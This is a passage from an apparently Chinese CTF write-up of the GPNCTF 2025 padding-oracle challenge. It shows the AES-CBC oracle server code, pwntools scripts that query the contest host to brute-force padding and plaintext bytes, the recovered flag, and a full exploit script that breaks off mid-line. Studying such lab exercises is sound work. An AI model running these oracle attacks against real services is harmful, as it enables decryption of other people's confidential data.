class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">MAX_TRIES = <span class="keyword">lambda</span> x: <span class="built_in">len</span>(x)*<span class="number">40</span>  <span class="comment"># 严格限制了爆破的次数</span></span><br><span class="line">TEXT_FILE = <span class="string">&quot;text.txt&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getText</span>(<span class="params">n=<span class="number">10</span></span>)-&gt;<span class="built_in">str</span>:</span><br><span class="line">    lines = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(TEXT_FILE, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">    <span class="comment">#print(len(lines), &quot;lines loaded from text file.&quot;)</span></span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        line =secrets.choice(lines)</span><br><span class="line">        line =line.split(<span class="string">&quot; &quot;</span>,<span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line">        out += line.strip()</span><br><span class="line">    <span class="comment">#out = &quot;abc&quot;*100 + &quot;bcd&quot;*100+&quot;A&quot;  # 题目给出了密文的形式,应该就是用于减少爆破次数的.</span></span><br><span class="line">    out = <span class="string">&quot;&quot;</span>.join(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x <span class="keyword">in</span> string.ascii_letters,out))</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PadServer</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,text</span>):</span><br><span class="line">        self.queries = [<span class="number">0</span>]</span><br><span class="line">        self.key =  os.urandom(<span class="number">16</span>)</span><br><span class="line">        self.cipher = AES.new(self.key, AES.MODE_CBC)</span><br><span class="line">        self.chall = text.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(random.randint(<span class="number">0</span>,<span class="number">4</span>)):</span><br><span class="line">                self.chall += <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>)+(os.urandom(<span class="number">1</span>)[<span class="number">0</span>] % <span class="number">26</span>)).encode()<span class="comment"># 明文 = getText(n) 的输出（仅包含英文字母）+ 0~4 个随机大写字母（来自 &#x27;A&#x27;-&#x27;Z&#x27;）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        self.iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">        <span class="comment">#print(f&quot;Padding is : &#123;self.pad(self.chall).hex()&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">cutq</span>(<span class="params">self</span>):</span><br><span class="line">        self.queries+=[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_chall</span>(<span class="params">self</span>):</span><br><span class="line">        aes = AES.new(self.key, AES.MODE_CBC, self.iv)</span><br><span class="line">        <span class="keyword">return</span> self.iv+aes.encrypt(self.pad(self.chall))</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">self, s</span>):</span><br><span class="line">        padbit = <span class="number">16</span> - <span class="built_in">len</span>(s) % <span class="number">16</span></span><br><span class="line">        padding = <span class="built_in">bytes</span>([padbit] * padbit)</span><br><span class="line">        <span class="keyword">return</span> s + padding</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">unpad</span>(<span class="params">self, s</span>):</span><br><span class="line">        padbit = s[-<span class="number">1</span>]</span><br><span class="line">        padding = s[-padbit:]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">set</span>(padding) == &#123;padbit&#125;:</span><br><span class="line">            <span class="keyword">return</span> s[:-s[-<span class="number">1</span>]]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, ciphertext</span>):</span><br><span class="line">        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)</span><br><span class="line">        plaintext = cipher.decrypt(ciphertext)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">self, ciphertext</span>):</span><br><span class="line">        self.queries[-<span class="number">1</span>] += <span class="number">1</span></span><br><span class="line">        plaintext = self.decrypt(ciphertext)</span><br><span class="line">        <span class="comment">#print(&quot;oracle request decrypts to &quot;, plaintext.hex())</span></span><br><span class="line">        <span class="keyword">if</span> self.unpad(plaintext) == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getFlag</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read().strip()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a:<span class="built_in">bytes</span>,b:<span class="built_in">bytes</span></span>)-&gt;<span class="built_in">bytes</span>:</span><br><span class="line"></span><br><span class="line">    ml  = <span class="built_in">max</span>(<span class="built_in">len</span>(a),<span class="built_in">len</span>(b))</span><br><span class="line">    a = a.ljust(ml, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    b = b.ljust(ml, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Welcome to the Pad Server!&quot;</span>)</span><br><span class="line">    FLAG =getFlag()</span><br><span class="line">    text =getText()</span><br><span class="line">    oracle =PadServer(text)</span><br><span class="line">    MAX_TRIES = MAX_TRIES(text)</span><br><span class="line">    tries = <span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(xor(sha512(text[:-<span class="number">3</span>].encode(<span class="string">&quot;utf-8&quot;</span>)).digest(),FLAG.encode()).<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(oracle.get_chall().<span class="built_in">hex</span>())</span><br><span class="line">    <span class="keyword">while</span> tries &lt; MAX_TRIES:</span><br><span class="line">        ciph = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">&quot;speak to the oracle: &quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(ciph) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Ciphertext must be a multiple of 16 bytes.&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Oracle says: &quot;</span>, oracle.oracle(ciph))</span><br><span class="line">        tries+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>首先需要接收消息，并从消息中分离数<code>vi</code>和<code>密文</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_bytes</span>(<span class="params">block</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(block))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(block)==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(block)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">padding</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([padding] * padding)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p =  remote(<span class="string">&quot;newford-of-charged-unity.gpn23.ctf.kitctf.de&quot;</span>, <span class="string">&quot;443&quot;</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Welcome to the Pad Server!\n&#x27;</span>)</span><br><span class="line">c1 = p.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line"><span class="built_in">print</span>(c1)</span><br><span class="line">iv_c2 = p.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line"><span class="built_in">print</span>(iv_c2)</span><br><span class="line">iv = iv_c2[:<span class="number">32</span>]</span><br><span class="line">c2 = iv_c2[<span class="number">32</span>:]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c2=&#x27;</span>,c2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;iv=&#x27;</span>,iv)</span><br><span class="line">l = <span class="built_in">len</span>(c2)</span><br><span class="line">ll = l//<span class="number">32</span></span><br><span class="line"><span class="built_in">print</span>(l)</span><br><span class="line"><span class="built_in">print</span>(l//<span class="number">32</span>)</span><br><span class="line">c_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ll):</span><br><span class="line">    c_list.append(c2[i*<span class="number">32</span>:i*<span class="number">32</span>+<span class="number">32</span>])</span><br><span class="line"><span class="built_in">print</span>(c_list)</span><br><span class="line"><span class="built_in">print</span>(my_bytes(c_list[-<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><ul><li>之后就是爆破出<code>padding</code>的个数</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">padding = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    block1 = my_bytes(c_list[-<span class="number">2</span>])</span><br><span class="line">    block2 = my_bytes(c_list[-<span class="number">1</span>])</span><br><span class="line">    payload = (block1[:i]+xor(block1[i],<span class="string">b&#x27;\x10&#x27;</span>)+block1[i+<span class="number">1</span>:]+block2).<span class="built_in">hex</span>().encode()</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;speak to the oracle:&#x27;</span>,payload)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Oracle says:  &#x27;</span>)</span><br><span class="line">    rec = p.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">    <span class="built_in">print</span>(rec)</span><br><span class="line">    <span class="keyword">if</span> rec==<span class="string">&#x27;False&#x27;</span>:</span><br><span class="line">        padding=<span class="number">0x10</span>-i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;padding----&gt;&quot;</span>,padding)</span><br></pre></td></tr></table></figure><p><img src="/2025/09/05/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GPNCTF2025%E5%A4%8D%E7%8E%B0/image-20250716100001976.png" alt="image-20250716100001976"></p><ul><li>尝试爆破最后一块剩余没有被<code>padding</code>填充的部分，会发现爆破出来的，字母目前只有大写字母和小写字母。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 破解尾块的数据</span></span><br><span class="line">text = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(padding,<span class="number">16</span>,<span class="number">1</span>):</span><br><span class="line">    t = j-padding</span><br><span class="line">    padd = pad(padding)</span><br><span class="line">    padd2 = pad(j + <span class="number">1</span>)[:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(padd2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;------------第<span class="subst">&#123;<span class="number">15</span>-j&#125;</span>位爆破--------------&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">        payload = (block1[:<span class="number">15</span>-j]+xor(block1[<span class="number">15</span>-j],i.to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>))+xor(xor(block1[<span class="number">16</span>-j:],text.encode()+padd),padd2)+block2).<span class="built_in">hex</span>().encode()</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;speak to the oracle:&#x27;</span>,payload)</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Oracle says:  &#x27;</span>)</span><br><span class="line">        rec = p.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">        <span class="built_in">print</span>(rec)</span><br><span class="line">        <span class="keyword">if</span> rec==<span class="string">&#x27;True&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;find---&gt;&quot;</span>,xor(i.to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>),j+<span class="number">1</span>))</span><br><span class="line">            text = xor(i.to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>),j+<span class="number">1</span>).decode() + text</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;text---&gt;&quot;</span>,text)</span><br><span class="line">            sleep(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment">#out = &quot;abc&quot;*100 + &quot;bcd&quot;*100+&quot;A&quot;  # 题目给出了密文的形式,应该就是用于减少爆破次数的.</span></span><br></pre></td></tr></table></figure><p><img src="/2025/09/05/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GPNCTF2025%E5%A4%8D%E7%8E%B0/image-20250716095632989.png" alt="image-20250716095632989"></p><ul><li>但是由于有限制次数，而题目中又给了<code>key</code>是大小写字母，所以我们可以构造如下列表，用于减少爆破次数</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 建立一个列表,用于爆破使用,爆破只选择对应对应索引与字母的异或值,从而减少爆破次数</span></span><br><span class="line">latter = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">a = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">17</span>):</span><br><span class="line">    x = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> latter:</span><br><span class="line">        <span class="built_in">print</span>(j)</span><br><span class="line">        x.append(i^(<span class="built_in">ord</span>(j)))</span><br><span class="line">        <span class="comment">#print(x)</span></span><br><span class="line">    a.append(x)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>减少次数后就可以在有限次数绕过爆破出<code>key</code>，在爆破的时候还需要考虑一下时间问题，明文非常长，但是靶机只有<code>30</code>分钟的限制。但是在爆破的过程中会发现明文是德国新闻的一些句子。</li></ul><p><img src="/2025/09/05/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GPNCTF2025%E5%A4%8D%E7%8E%B0/image-20250716143239889.png" alt="image-20250716143239889"></p><ul><li>这就需要对单词进行词频分析，从而减少爆破的时间，并且还发现，每次连接发送过来的块长度不一样，有的块长度到达了<code>60</code>多，有的才<code>30</code>多或者<code>40</code>多，所以我们应该选择<code>40</code>多、<code>30</code>多块的来进行爆破，这样也能节省时间。这样能使得平均每块爆破时间降低到<code>38.07秒</code></li></ul><p><img src="/2025/09/05/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GPNCTF2025%E5%A4%8D%E7%8E%B0/image-20250716144442590.png" alt="image-20250716144442590"></p><ul><li>爆破出来<code>text</code>后再去掉最后的大写字母，即可得到结果</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a:<span class="built_in">bytes</span>,b:<span class="built_in">bytes</span></span>)-&gt;<span class="built_in">bytes</span>:</span><br><span class="line">    ml  = <span class="built_in">max</span>(<span class="built_in">len</span>(a),<span class="built_in">len</span>(b))</span><br><span class="line">    a = a.ljust(ml, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    b = b.ljust(ml, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(x ^^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b))</span><br><span class="line">    </span><br><span class="line">c1 = <span class="string">&#x27;wiederumhatbereitsweitereEntlassungenbeiWallStreetBankenundanderenFinanzinstitutionenzurFolgeEinwandererausDeutschlandsetzenflschlicherweiseeineLehremitdemgesellschaftlichenAbstieggleichHPIncwirdesdiesenMarktauchweiterhinadressierenerklrtderBritewarumausMcLarenSichtvielfreinMotorenUpdateinSpielbergsprichtkuriertderMinistereinenBeinbruchausundGtzeuernsichnichtBildNchstesBildDiesesBildmachtedasaustralischeMerinoschafChrisweltweitbekanntSeptemberseienalleDetailszuderAbschaltsoftwareoffengelegtwordenvergrernBildinfoausblendenBildWaserwartenSieindieserPhasevonIhrenSpielernWosinddennjetztallehindienochvoreinpaarJahren&#x27;</span></span><br><span class="line">c2 = <span class="string">&#x27;d620ed061b06427d260bda1af508da1517a84b5d93a9c466a65ca608a671bdffd941e829a0c923b69c9187dba50ffcdf81351c7f117503ba78b664b72643e626&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(c2))</span><br><span class="line"><span class="built_in">print</span>(xor(hashlib.sha512(c1[:-<span class="number">3</span>].encode(<span class="string">&quot;utf-8&quot;</span>)).digest(),<span class="built_in">bytes</span>.fromhex(c2)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(c1)//<span class="number">16</span>)</span><br><span class="line"><span class="string">b&#x27;GPNCTF&#123;nic3_Gu3SS1Ng_p4DdInG_iS_FuN&#125;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line"><span class="number">38</span></span><br></pre></td></tr></table></figure><p><img src="/2025/09/05/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GPNCTF2025%E5%A4%8D%E7%8E%B0/image-20250716161430730.png" alt="image-20250716161430730"></p><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="comment"># 建立一个列表,用于爆破使用,爆破只选择对应对应索引与字母的异或值,从而减少爆破次数</span></span><br><span class="line"><span class="comment"># 高频次出现的字母放在前面减少爆破次数和时间</span></span><br><span class="line">latter = <span class="string">&#x27;enisratdhulcgmobwfkzvpjyxqSDMBNAFEKLGHTWRZIUPCJVOYXQ&#x27;</span> </span><br><span class="line">a = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">17</span>):</span><br><span class="line">    x = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> latter:</span><br><span class="line">        <span class="built_in">print</span>(j)</span><br><span class="line">        x.append(i^(<span class="built_in">ord</span>(j)))</span><br><span class="line">        <span class="comment">#print(x)</span></span><br><span class="line">    a.append(x)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">text = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_bytes</span>(<span class="params">block</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(block))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(block)==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(block)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">padding</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([padding] * padding)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack_other_block</span>(<span class="params">pre_list,lat_list</span>):</span><br><span class="line">    <span class="keyword">global</span> text</span><br><span class="line">    block1 = my_bytes(pre_list)</span><br><span class="line">    block2 = my_bytes(lat_list)</span><br><span class="line">    text1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a[<span class="number">1</span>]:</span><br><span class="line">        payload = block1[:<span class="number">15</span>]</span><br><span class="line">        payload += xor(block1[<span class="number">15</span>], i.to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        payload += block2</span><br><span class="line">        payload = payload.<span class="built_in">hex</span>().encode()  <span class="comment"># 转换为16进制字符形式,再转换为字节形式发送</span></span><br><span class="line">        <span class="comment">#print(len(payload))</span></span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;speak to the oracle:&#x27;</span>,payload)</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Oracle says:  &#x27;</span>)</span><br><span class="line">        rec = p.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">        <span class="comment">#print(rec)</span></span><br><span class="line">        <span class="keyword">if</span> rec == <span class="string">&#x27;True&#x27;</span>:  <span class="comment"># 判断是否能得到True的应答</span></span><br><span class="line">            <span class="comment">#print(&quot;find---&gt;&quot;, xor(i.to_bytes(1, &#x27;big&#x27;), 1))  # 爆破到明文</span></span><br><span class="line">            text = xor(i.to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>), <span class="number">1</span>).decode() + text  <span class="comment"># 这里应该需要修改为异或1</span></span><br><span class="line">            <span class="comment">#print(&quot;text---&gt;&quot;, text)</span></span><br><span class="line">            text1 = xor(i.to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>), <span class="number">1</span>).decode() + text1</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">16</span>, 